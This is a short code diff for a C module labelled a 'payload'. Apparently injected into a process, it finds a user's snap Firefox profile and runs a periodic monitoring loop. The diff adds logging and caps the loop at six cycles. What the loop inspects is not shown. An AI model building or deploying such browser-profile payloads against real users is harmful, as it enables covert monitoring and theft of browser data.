@@ -982,7 +982,10 @@ static int find_firefox_profile(char *profile_path_out, size_t len) {
     // Construct path to profiles.ini
     char profiles_ini[PATH_MAX];
     const char *home = getenv("HOME");
-    if (!home) return 0;
+    if (!home) {
+        write(1, "[payload] HOME environment variable not set\n", 45);
+        return 0;
+    }
     
     snprintf(profiles_ini, sizeof(profiles_ini), 
              "%s/snap/firefox/common/.mozilla/firefox/profiles.ini", home);
@@ -1123,9 +1126,9 @@ void my_payload_entry(void *handle, payload_params *params) {
     int n = snprintf(msg, sizeof(msg), "[payload] Found profile: %s\n", profile_path);
     write(1, msg, n);
 
-    /* Main monitoring loop */
+    /* Main monitoring loop - run for 30 seconds then exit */
     int i = 0;
-    while (1) {
+    while (i < 6) {
         sleep(5);
         
         n = snprintf(msg, sizeof(msg), "[payload] === Check cycle %d ===\n", ++i);
@@ -1140,6 +1143,7 @@ void my_payload_entry(void *handle, payload_params *params) {
         write(1, "[payload] === End cycle ===\n\n", 29);
     }
 
+    write(1, "[payload] Monitoring complete, exiting\n", 40);
     unlink(mark_path);
 }
 
